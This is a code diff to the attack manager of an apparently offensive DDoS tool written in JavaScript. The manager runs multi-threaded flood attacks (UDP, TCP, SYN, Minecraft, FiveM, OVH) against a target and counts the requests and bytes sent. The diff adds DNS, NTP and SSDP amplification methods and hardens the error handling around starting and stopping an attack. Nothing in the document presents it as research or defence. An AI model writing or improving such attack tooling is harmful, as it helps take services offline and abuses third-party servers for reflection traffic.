@@ -3,10 +3,10 @@ import { Tools } from '../utils/tools.js';
 import { logger } from '../utils/logger.js';
 
 // Layer 4 Methods
-import { 
-    UDPFlood, 
-    TCPFlood, 
-    MinecraftFlood, 
+import {
+    UDPFlood,
+    TCPFlood,
+    MinecraftFlood,
     MinecraftBot,
     SYNFlood,
     VSEFlood,
@@ -16,7 +16,10 @@ import {
     FiveMTokenFlood,
     CPSFlood,
     ConnectionFlood,
-    OVHUDPFlood
+    OVHUDPFlood,
+    DNSAmplification,
+    NTPAmplification,
+    SSDPAmplification
 } from '../methods/layer4/index.js';
 
 // Layer 7 Methods
@@ -82,38 +85,64 @@ export class AttackManager {
      * Start the attack
      */
     async start() {
-        this.active = true;
-        this.startTime = Date.now();
-        this.autoStopTimeout = null;
+        try {
+            this.active = true;
+            this.startTime = Date.now();
+            this.autoStopTimeout = null;
 
-        logger.info(`🎯 Starting ${this.method} attack on ${this.target}`);
-        logger.info(`⚙️  Threads: ${this.threads}, Duration: ${this.duration}s`);
+            logger.info(`🎯 Starting ${this.method} attack on ${this.target}`);
+            logger.info(`⚙️  Threads: ${this.threads}, Duration: ${this.duration}s`);
 
-        // Reset counters
-        REQUESTS_SENT.reset();
-        BYTES_SENT.reset();
+            // Reset counters
+            REQUESTS_SENT.reset();
+            BYTES_SENT.reset();
 
-        // Create attack threads (non-blocking)
-        setImmediate(() => {
-            for (let i = 0; i < this.threads; i++) {
-                const attackInstance = this.createAttackInstance();
-                if (attackInstance) {
-                    this.attackThreads.push(attackInstance);
-                    attackInstance.start().catch(err => {
-                        // Log errors but don't stop attack
-                        logger.debug(`Thread ${i} error: ${err.message}`);
-                    });
-                }
+            // Validate method before starting
+            const testInstance = this.createAttackInstance();
+            if (!testInstance) {
+                throw new Error(`Invalid or unsupported method: ${this.method}`);
             }
-        });
 
-        // Start stats monitoring
-        this.startStatsMonitoring();
+            // Create attack threads (non-blocking)
+            setImmediate(() => {
+                try {
+                    for (let i = 0; i < this.threads; i++) {
+                        try {
+                            const attackInstance = this.createAttackInstance();
+                            if (attackInstance) {
+                                this.attackThreads.push(attackInstance);
+                                attackInstance.start().catch(err => {
+                                    // Log errors but don't stop attack
+                                    logger.debug(`Thread ${i} error: ${err.message}`);
+                                });
+                            } else {
+                                logger.debug(`Failed to create attack instance for thread ${i}`);
+                            }
+                        } catch (threadErr) {
+                            logger.debug(`Error creating thread ${i}: ${threadErr.message}`);
+                        }
+                    }
+                } catch (err) {
+                    logger.error(`Error in thread creation loop: ${err.message}`);
+                }
+            });
 
-        // Auto-stop after duration
-        this.autoStopTimeout = setTimeout(() => {
-            this.stop();
-        }, this.duration * 1000);
+            // Start stats monitoring
+            this.startStatsMonitoring();
+
+            // Auto-stop after duration
+            this.autoStopTimeout = setTimeout(() => {
+                try {
+                    this.stop();
+                } catch (err) {
+                    logger.error(`Error in auto-stop: ${err.message}`);
+                }
+            }, this.duration * 1000);
+        } catch (err) {
+            logger.error(`Failed to start attack: ${err.message}`);
+            this.active = false;
+            throw err;
+        }
     }
 
     /**
@@ -186,6 +215,22 @@ export class AttackManager {
         if (['OVH-UDP'].includes(method)) {
             const [host, port] = this.parseTarget();
             return new OVHUDPFlood(host, port, this.duration, this.proxies);
+        }
+
+        // Amplification Methods
+        if (['DNS-AMP'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new DNSAmplification(host, port, this.duration, this.proxies);
+        }
+
+        if (['NTP-AMP'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new NTPAmplification(host, port, this.duration, this.proxies);
+        }
+
+        if (['SSDP-AMP'].includes(method)) {
+            const [host, port] = this.parseTarget();
+            return new SSDPAmplification(host, port, this.duration);
         }
 
         // Layer 7 Methods
@@ -425,17 +470,27 @@ export class AttackManager {
      * Parse target into host and port
      */
     parseTarget() {
-        if (this.target.includes('://')) {
-            const url = new URL(this.target);
-            return [url.hostname, url.port || 80];
-        }
+        try {
+            if (this.target.includes('://')) {
+                const url = new URL(this.target);
+                const port = url.port || (url.protocol === 'https:' ? 443 : 80);
+                return [url.hostname, parseInt(port)];
+            }
 
-        if (this.target.includes(':')) {
-            const [host, port] = this.target.split(':');
-            return [host, parseInt(port)];
-        }
+            if (this.target.includes(':')) {
+                const [host, port] = this.target.split(':');
+                const parsedPort = parseInt(port);
+                if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
+                    throw new Error(`Invalid port number: ${port}`);
+                }
+                return [host, parsedPort];
+            }
 
-        return [this.target, 80];
+            return [this.target, 80];
+        } catch (err) {
+            logger.error(`Failed to parse target '${this.target}': ${err.message}`);
+            throw new Error(`Invalid target format: ${this.target}`);
+        }
     }
 
     /**
@@ -461,35 +516,72 @@ export class AttackManager {
      * Stop the attack
      */
     stop() {
-        if (!this.active) return;
+        try {
+            if (!this.active) return;
 
-        this.active = false;
-        logger.info('🛑 Stopping attack...');
+            this.active = false;
+            logger.info('🛑 Stopping attack...');
 
-        // Clear auto-stop timeout
-        if (this.autoStopTimeout) {
-            clearTimeout(this.autoStopTimeout);
-            this.autoStopTimeout = null;
-        }
-
-        // Stop all attack threads
-        this.attackThreads.forEach(thread => {
-            if (thread && thread.stop) {
-                thread.stop();
+            // Clear auto-stop timeout
+            if (this.autoStopTimeout) {
+                try {
+                    clearTimeout(this.autoStopTimeout);
+                } catch (err) {
+                    logger.debug(`Error clearing timeout: ${err.message}`);
+                }
+                this.autoStopTimeout = null;
             }
-        });
 
-        // Clear attack threads array
-        this.attackThreads = [];
+            // Stop all attack threads
+            this.attackThreads.forEach((thread, index) => {
+                try {
+                    if (thread && typeof thread.stop === 'function') {
+                        thread.stop();
+                    }
+                } catch (err) {
+                    logger.debug(`Error stopping thread ${index}: ${err.message}`);
+                }
+            });
 
-        // Clear stats interval
-        if (this.statsInterval) {
-            clearInterval(this.statsInterval);
-            this.statsInterval = null;
+            // Clear attack threads array
+            this.attackThreads = [];
+
+            // Clear stats interval
+            if (this.statsInterval) {
+                try {
+                    clearInterval(this.statsInterval);
+                } catch (err) {
+                    logger.debug(`Error clearing stats interval: ${err.message}`);
+                }
+                this.statsInterval = null;
+            }
+
+            // Force garbage collection if available
+            if (global.gc) {
+                try {
+                    global.gc();
+                    logger.debug('Garbage collection triggered');
+                } catch (e) {
+                    logger.debug('GC not available');
+                }
+            }
+
+            logger.success('✅ Attack stopped successfully!');
+            logger.info(`📊 Final Stats - Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | Data: ${Tools.humanBytes(BYTES_SENT.get())}`);
+        } catch (err) {
+            logger.error(`Error stopping attack: ${err.message}`);
+            // Force cleanup even if there's an error
+            this.active = false;
+            this.attackThreads = [];
+            if (this.statsInterval) {
+                clearInterval(this.statsInterval);
+                this.statsInterval = null;
+            }
+            if (this.autoStopTimeout) {
+                clearTimeout(this.autoStopTimeout);
+                this.autoStopTimeout = null;
+            }
         }
-
-        logger.success('✅ Attack stopped successfully!');
-        logger.info(`📊 Final Stats - Requests: ${Tools.humanFormat(REQUESTS_SENT.get())} | Data: ${Tools.humanBytes(BYTES_SENT.get())}`);
     }
 
     /**
